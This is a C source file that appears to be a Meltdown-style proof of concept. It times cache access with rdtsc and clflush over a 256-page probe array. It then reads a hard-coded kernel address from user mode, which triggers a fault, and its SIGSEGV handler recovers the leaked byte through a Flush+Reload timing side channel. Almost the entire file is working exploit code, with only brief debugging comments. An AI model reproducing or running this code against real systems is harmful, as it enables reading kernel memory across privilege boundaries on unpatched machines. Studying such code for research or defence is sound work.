#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <limits.h>

#define PAGE_SIZE		4096
#define CLFLUSH_SIZE		64
#define MAX_INDEX		256

struct page {
	char _page[PAGE_SIZE];
};
struct page *probe_array;

static inline unsigned long long rdtsc(void)
{
	unsigned long low, high;
	asm volatile (
		"mfence\n\t"
		"rdtsc\n\t"
		"mfence\n\t"
		: "=a" (low), "=d" (high)
	);
	return ((low) | (high) << 32);
}

static inline void clflush(volatile void *__p)
{
	asm volatile (
		"clflush %0"
		: "+m" (*(volatile char *)__p)
	);
}


#define wmb()	asm volatile ("sfence" ::: "memory")
#define mb()	asm volatile ("mfence" ::: "memory")

static inline void clflush_buffer(void *vaddr, unsigned int size)
{
	unsigned long clflush_mask = CLFLUSH_SIZE - 1;
	void *vend = vaddr + size;
	void *p;

	for (p = (void *)((unsigned long)vaddr & ~clflush_mask);
	     p < vend; p += CLFLUSH_SIZE) {
		clflush(p);
	}
	wmb();
}

static void signal_handler(int signum)
{
	int i, min_i;
	unsigned long min_diff;

	min_i = MAX_INDEX + 1;
	min_diff = ULONG_MAX;

	for (i = 0; i < MAX_INDEX; i++) {
		int *ptr, foo;
		unsigned long start_1, end_1, diff_1;
		unsigned long start_2, end_2, diff_2;

		ptr = (int *)(probe_array + i);

		start_1 = rdtsc();
		foo = *ptr;
		end_1 = rdtsc();
		diff_1 = end_1 - start_1;

		clflush(ptr);
#if 1
		start_2 = rdtsc();
		foo = *ptr;
		end_2 = rdtsc();
		diff_2 = end_2 - start_2;

		printf(" %#4x %p \t %lu %lu\n", i, ptr, diff_1, diff_2);
#endif

		if (diff_1 < min_diff) {
			min_i = i;
			min_diff = diff_1;
		}
	}
	printf("min_i: %#x min_diff: %lu\n", min_i, min_diff);
	exit(0);
}

static void install_signal_handler(void)
{
	struct sigaction new, old;

	new.sa_handler = signal_handler;
	if (sigaction(SIGSEGV, &new, &old)) {
		printf("Fail to install signal handler\n");
		exit(errno);
	}
}

static void init_probe_array(void)
{
	int i;

	posix_memalign((void **)&probe_array, PAGE_SIZE, PAGE_SIZE * MAX_INDEX);
	if (!probe_array) {
		printf("OOM");
		exit(-ENOMEM);
	}

	for (i = 0; i < MAX_INDEX; i++) {
		int *ptr, foo;
		unsigned long start_1, end_1, diff_1;
		unsigned long start_2, end_2, diff_2;
		unsigned long start_3, end_3, diff_3;

		ptr = (int *)(probe_array + i);

		/*
		 * Fisrt touch to establish the pgtable mapping
		 * and it must be write, otherwise the zero page will be used.
		 */
		start_1 = rdtsc();
		*ptr = 100;
		end_1 = rdtsc();
		diff_1 = end_1 - start_1;

		/* cache hit latency */
		start_2 = rdtsc();
		foo = *ptr;
		end_2 = rdtsc();
		diff_2 = end_2 - start_2;

		/* cache miss latency */
		clflush_buffer(ptr, PAGE_SIZE);
		start_3 = rdtsc();
		foo = *ptr;
		end_3 = rdtsc();
		diff_3 = end_3 - start_3;

		printf(" %#4x %p %8lu %8lu %8lu\n",
			i, ptr, diff_1, diff_2, diff_3);

		clflush_buffer(ptr, PAGE_SIZE);
	}
	clflush_buffer(probe_array, PAGE_SIZE * MAX_INDEX);
}

int main(void)
{
	char index;
	unsigned long victim_address, unused;

	install_signal_handler();
	init_probe_array();

	victim_address = 0xffffffff81d96d27;

#if 0
	/*
	 * Used to debug
	 * You can clearly see that 0x55 will be detected by signal handler
	 */
	unused = *(unsigned long *)(probe_array + (unsigned int)0x55);
#endif

	mb();
	index = *(char *)victim_address;
	unused = *(unsigned long *)(probe_array + (unsigned int)index);

	for (;;)
		;
	return 0;
}
